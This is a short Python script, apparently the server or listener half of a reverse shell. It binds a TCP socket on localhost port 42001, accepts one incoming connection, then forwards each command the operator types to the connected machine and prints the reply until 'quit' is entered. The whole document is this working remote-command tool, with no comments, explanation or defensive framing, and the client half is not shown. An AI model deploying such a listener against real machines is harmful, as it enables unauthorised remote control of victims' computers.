import sys
import socket

port=42001
host='localhost'

def create():
  try:
    global sock
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  except socket.error as err:
      print("Failed to create socket: "+str(err))

def bind():
    try:
        global sock
        sock.bind((host,port))
        sock.listen(5)
    except socket.error as err:
      print("Failed to bind socket: "+str(err)+"  retrying....")
      bind()
def commands():
        global sock  
        conn,addr=sock.accept()
        print("Connection has been established | " + "IP " + addr[0] + " | Port " + str(addr[1]))
        while True:
           shell=input()
           if shell != 'quit':
               if len(str.encode(shell))>0:
                 conn.send(str.encode(shell))
                 response=str(conn.recv(1024))
                 print(response)
           else:
                conn.close()
                sock.close()
                sys.exit()

def main():
    create()
    bind()
    commands()

if __name__=='__main__':
    main()
